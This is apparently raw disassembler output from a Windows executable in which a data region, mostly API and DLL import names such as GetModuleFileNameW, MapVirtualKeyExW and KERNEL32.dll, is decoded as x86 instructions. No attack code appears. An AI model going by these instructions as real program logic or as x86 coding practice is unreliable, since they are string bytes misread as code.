  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
